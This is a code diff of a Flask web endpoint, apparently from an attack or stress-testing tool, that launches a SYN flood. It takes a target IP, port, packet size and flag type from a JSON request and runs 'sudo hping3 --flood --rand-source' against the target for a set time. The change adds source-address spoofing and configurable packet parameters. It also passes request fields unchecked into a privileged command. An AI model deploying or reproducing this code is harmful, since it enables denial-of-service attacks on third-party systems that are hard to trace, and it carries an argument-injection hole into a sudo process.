@@ -1,11 +1,6 @@
 from flask import Blueprint, request
-import nmap
 import signal
 import subprocess
-from scapy.layers.inet import IP, TCP, ICMP
-from scapy.packet import Raw
-from scapy.sendrecv import send
-from scapy.volatile import RandShort
 import time
 
 dosAttack = Blueprint("dosAttack", __name__, url_prefix="/dosAttack")
@@ -15,16 +10,15 @@ def SYNFloodAttack():
     data = request.get_json()
     ipAddress = data["ipAddress"]
     portNumber = data["portNumber"]
-    # type = data["type"]
+    packetSize = data["packetSize"]
+    type = data["type"]
     duration = int(data["duration"])
 
-    dosCommand = subprocess.Popen(['sudo', 'hping3', '-S', '--flood', '-p', portNumber, ipAddress])
+    dosCommand = subprocess.Popen(['sudo', 'hping3', type, '-d', packetSize, '--flood', '--rand-source', '-p', portNumber, ipAddress])
     time.sleep(duration) # carry out attack for specified duration
 
     try:
-        # Send CTRL+c to kill the child process from su -
-        dosCommand.send_signal(signal.SIGINT)
-        print("CTRL+c killed the process")
+        dosCommand.send_signal(signal.SIGINT) # Send CTRL+c to kill the child process
     except subprocess.TimeoutExpired:
         print('Timeout occured')
     
